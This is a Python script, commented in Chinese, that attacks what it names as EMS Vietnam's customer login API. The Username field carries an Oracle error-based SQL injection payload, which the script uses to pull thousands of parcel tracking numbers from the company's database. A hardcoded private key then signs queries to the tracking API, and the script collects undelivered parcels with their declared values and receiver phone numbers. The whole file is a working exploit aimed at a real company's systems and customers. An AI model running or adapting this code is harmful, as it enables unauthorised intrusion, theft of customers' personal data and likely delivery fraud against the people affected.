#!/usr/bin/env python3
"""
快速提取10,000个未签收订单
策略：每天只提取少量样本，快速验证
"""
import requests
import time
import json
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import threading
import random

# API配置
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
API_URL = "https://api-dingdong.ems.com.vn/api/TrackTrace/Lading"

# 全局统计
lock = threading.Lock()
total_found = 0
total_checked = 0
results = []

def inject(payload):
    """SQL注入"""
    data = {'Username': payload, 'Password': 'test'}
    try:
        return requests.post('https://customerconnect.ems.com.vn/api/User_Customer/Login', 
                           json=data, timeout=20)
    except:
        return None

def extract(query, retries=2):
    """提取数据"""
    for attempt in range(retries):
        payload = f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1325=CTXSYS.DRITHSX.SN(1325,(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||({query})||CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        r = inject(payload)
        if r and r.text and 'qjvjq' in r.text:
            try:
                s = r.text.index('qjvjq')+5
                return r.text[s:r.text.index('qkvzq',s)]
            except:
                pass
        if attempt < retries - 1:
            time.sleep(0.5)
    return None

def generate_signature(code):
    """生成API签名"""
    data = code.upper() + PRIVATE_KEY
    return hashlib.sha256(data.encode('utf-8')).hexdigest().upper()

def verify_tracking(code):
    """验证运单号并检查是否未签收"""
    global total_checked, total_found
    
    signature = generate_signature(code)
    payload = {'LadingCode': code.upper(), 'Signature': signature}
    
    try:
        response = requests.post(API_URL, json=payload, timeout=8)
        result = response.json()
        
        with lock:
            total_checked += 1
        
        if result.get('Code') == '00':
            data = result.get('Value', {})
            
            # 只要未签收的
            signed = bool(data.get('SignatureCapture'))
            if signed:
                return None
            
            # 未签收，返回信息
            info = {
                'code': code,
                'value': data.get('Value', 0) or 0,
                'fee': data.get('Fee', 0) or 0,
                'receiver_phone': data.get('ReceiverMobile', ''),
            }
            
            with lock:
                total_found += 1
                results.append(info)
            
            return info
            
    except Exception as e:
        pass
    
    time.sleep(0.05)
    return None

def extract_samples(date_str, sample_size=500):
    """从数据库随机提取样本运单号"""
    # 获取总数
    total_query = f"SELECT TO_CHAR(COUNT(DISTINCT ITEMCODE)) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date_str}' AND ITEMCODE LIKE 'E%VN'"
    total = extract(total_query)
    
    if not total or total == '0':
        return []
    
    total_num = int(total)
    print(f"   📊 {date_str}: {total_num}个 → 抽取{min(sample_size, total_num)}个")
    
    # 随机选择索引
    indices = random.sample(range(1, total_num + 1), min(sample_size, total_num))
    
    tracking_numbers = []
    
    for i in indices:
        query = f"""SELECT ITEMCODE FROM 
                   (SELECT ITEMCODE,ROWNUM AS RN FROM 
                   (SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS 
                   WHERE TOKENDATE='{date_str}' AND ITEMCODE LIKE 'E%VN' 
                   ORDER BY ITEMCODE) 
                   WHERE ROWNUM<={i}) 
                   WHERE RN={i}"""
        
        result = extract(query)
        if result:
            tracking_numbers.append(result)
        
        time.sleep(0.03)
        
        if len(tracking_numbers) % 100 == 0:
            print(f"   ✅ 已提取 {len(tracking_numbers)}/{len(indices)}", end='\r')
    
    print(f"   ✅ 提取完成: {len(tracking_numbers)}个           ")
    return tracking_numbers

def save_progress():
    """保存进度"""
    if results:
        with open('progress.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        with open('progress.txt', 'w', encoding='utf-8') as f:
            for item in results:
                f.write(f"{item['code']}\n")

def main():
    global total_found, total_checked
    
    print("="*80)
    print("🎯 快速提取10,000个未签收订单")
    print("="*80)
    print()
    
    # 测试连接
    if not inject('test'):
        print("❌ 数据库连接失败")
        return
    
    # 处理最近10天，每天抽样500个
    dates = [f"2025101{d}" for d in range(4, -1, -1)]  # 20251014-20251010
    dates += [f"2025100{d}" for d in range(9, 0, -1)]  # 20251009-20251001
    
    for date_str in dates:
        if total_found >= 10000:
            break
        
        print(f"\n{'='*80}")
        print(f"📅 {date_str}")
        print(f"{'='*80}")
        
        # 提取样本
        tracking_numbers = extract_samples(date_str, sample_size=500)
        
        if not tracking_numbers:
            continue
        
        print(f"\n🔍 验证中... (当前: {total_found}/10000)")
        
        # 多线程验证
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(verify_tracking, code): code 
                      for code in tracking_numbers}
            
            for future in as_completed(futures):
                if total_found >= 10000:
                    break
                
                info = future.result()
                if info and total_found % 50 == 0:
                    print(f"   ✅ {total_found}/10000 | 验证: {total_checked} | 有效率: {total_found/total_checked*100:.1f}%", end='\r')
                
                time.sleep(0.1)
        
        print(f"\n   ✅ {date_str} 完成: 新增 {len([r for r in results if r['code'] in tracking_numbers])}个")
        
        # 每完成一天保存一次
        save_progress()
    
    print("\n" + "="*80)
    print("🎉 提取完成！")
    print("="*80)
    print(f"✅ 找到: {total_found} 个未签收订单")
    print(f"📊 验证: {total_checked} 个运单号")
    print(f"✨ 有效率: {total_found/total_checked*100:.2f}%")
    print("="*80)
    
    # 保存最终结果
    if results:
        with open('unsigned_final.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        with open('unsigned_final.txt', 'w', encoding='utf-8') as f:
            for item in results:
                f.write(f"{item['code']}\n")
        
        print(f"\n💾 已保存: unsigned_final.json, unsigned_final.txt")

if __name__ == '__main__':
    main()
